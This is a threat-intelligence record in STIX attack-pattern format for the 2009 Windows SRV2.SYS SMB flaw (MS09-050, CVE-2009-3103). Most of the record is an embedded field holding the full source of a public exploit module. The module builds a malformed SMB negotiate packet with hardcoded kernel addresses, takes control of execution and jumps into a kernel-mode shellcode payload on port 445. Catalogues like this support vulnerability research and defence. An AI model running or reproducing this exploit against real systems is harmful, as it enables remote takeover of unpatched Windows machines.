{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--23ccd127-db5c-4eee-92f4-fc802993a557",
    "created": "2024-08-14T16:56:09.055912Z",
    "modified": "2024-08-14T16:56:09.055916Z",
    "name": "MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference",
    "description": " This module exploits an out of bounds function table dereference in the SMB request validation code of the SRV2.SYS driver included with Windows Vista, Windows 7 release candidates (not RTM), and Windows 2008 Server prior to R2. Windows Vista without SP1 does not seem affected by this flaw.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms09_050_smb2_negotiate_func_index.rb",
            "external_id": "ms09_050_smb2_negotiate_func_index.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3103"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2009/Sep/0039.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::KernelMode\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference',\n      'Description'    => %q{\n          This module exploits an out of bounds function table dereference in the SMB\n        request validation code of the SRV2.SYS driver included with Windows Vista, Windows 7\n        release candidates (not RTM), and Windows 2008 Server prior to R2. Windows Vista\n        without SP1 does not seem affected by this flaw.\n      },\n\n      'Author'         => [ 'Laurent Gaffie <laurent.gaffie[at]gmail.com>', 'hdm', 'sf' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'MSB', 'MS09-050' ],\n          [ 'CVE', '2009-3103' ],\n          [ 'BID', '36299' ],\n          [ 'OSVDB', '57799' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2009/Sep/0039.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'           => 1024,\n          'StackAdjustment' => -3500,\n          'DisableNops'     => true,\n          'EncoderType'     => Msf::Encoder::Type::Raw,\n          'ExtendedOptions' =>\n            {\n              'Stager'  => 'stager_sysenter_hook',\n            }\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Vista SP1/SP2 and Server 2008 (x86)',\n            {\n              'Platform'       => 'win',\n              'Arch'           => [ ARCH_X86 ],\n              'Ret'            => 0xFFD00D09, # \"POP ESI; RET\" from the kernels HAL memory region ...no ASLR :)\n              'ReadAddress'    => 0xFFDF0D04, # A readable address from kernel space (no nulls in address).\n              'ProcessIDHigh'  => 0x0217,     # srv2!SrvSnapShotScavengerTimer\n              'MagicIndex'     => 0x3FFFFFB4, # (DWORD)( MagicIndex*4 + 0x130 ) == 0\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-09-07'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(445),\n        OptInt.new( 'WAIT', [ true,  \"The number of seconds to wait for the attack to complete.\", 180 ] )\n      ])\n  end\n\n  # Not reliable enough for automation yet\n  def autofilter\n    false\n  end\n\n  def exploit\n    print_status( \"Connecting to the target (#{datastore['RHOST']}:#{datastore['RPORT']})...\" )\n    connect\n\n    # we use ReadAddress to avoid problems in srv2!SrvProcCompleteRequest\n    # and srv2!SrvProcPartialCompleteCompoundedRequest\n    dialects = [ [ target['ReadAddress'] ].pack(\"V\") * 25, \"SMB 2.002\" ]\n\n    data  = dialects.collect { |dialect| \"\\x02\" + dialect + \"\\x00\" }.join('')\n    data += [ 0x00000000 ].pack(\"V\") * 37 # Must be NULL's\n    data += [ 0xFFFFFFFF ].pack(\"V\")      # Used in srv2!SrvConsumeDataAndComplete2+0x34 (known stability issue with srv2!SrvConsumeDataAndComplete2+6b)\n    data += [ 0xFFFFFFFF ].pack(\"V\")      # Used in srv2!SrvConsumeDataAndComplete2+0x34\n    data += [ 0x42424242 ].pack(\"V\") * 7  # Unused\n    data += [ target['MagicIndex'] ].pack(\"V\") # An index to force an increment the SMB header value :) (srv2!SrvConsumeDataAndComplete2+0x7E)\n    data += [ 0x41414141 ].pack(\"V\") * 6  # Unused\n    data += [ target.ret ].pack(\"V\")      # EIP Control thanks to srv2!SrvProcCompleteRequest+0xD2\n    data += payload.encoded               # Our ring0 -> ring3 shellcode\n\n    # We gain code execution by returning into the SMB packet, beginning with its header.\n    # The SMB packets Magic Header value is 0xFF534D42 which assembles to \"CALL DWORD PTR [EBX+0x4D]; INC EDX\"\n    # This will cause an access violation if executed as we can never set EBX to a valid pointer.\n    # To overcome this we force an increment of the header value (via MagicIndex), transforming it to 0x00544D42.\n    # This assembles to \"ADD BYTE PTR [EBP+ECX*2+0x42], DL\" which is fine as ECX will be zero and EBP is a vaild pointer.\n    # We patch the Signature1 value to be a jump forward into our shellcode.\n    packet = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct\n    packet['Payload']['SMB'].v['Command']       = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE\n    packet['Payload']['SMB'].v['Flags1']        = 0x18\n    packet['Payload']['SMB'].v['Flags2']        = 0xC853\n    packet['Payload']['SMB'].v['ProcessIDHigh'] = target['ProcessIDHigh']\n    packet['Payload']['SMB'].v['Signature1']    = 0x0158E900 # \"JMP DWORD 0x15D\" ; jump into our ring0 payload.\n    packet['Payload']['SMB'].v['Signature2']    = 0x00000000 # ...\n    packet['Payload']['SMB'].v['MultiplexID']   = rand( 0x10000 )\n    packet['Payload'].v['Payload']              = data\n\n    packet = packet.to_s\n\n    print_status( \"Sending the exploit packet (#{packet.length} bytes)...\" )\n    sock.put( packet )\n\n\n    wtime = datastore['WAIT'].to_i\n    print_status( \"Waiting up to #{wtime} second#{wtime == 1 ? '' : 's'} for exploit to trigger...\" )\n    stime = Time.now.to_i\n\n\n    poke_logins = %W{Guest Administrator}\n    poke_logins.each do |login|\n      begin\n        sec = connect(false)\n        sec.login(datastore['SMBName'], login, rand_text_alpha(rand(8)+1), rand_text_alpha(rand(8)+1))\n      rescue ::Exception => e\n        sec.socket.close\n      end\n    end\n\n    while( stime + wtime > Time.now.to_i )\n      select(nil, nil, nil, 0.25)\n      break if session_created?\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-09-07",
    "x_mitre_platforms": [
        "win'"
    ]
}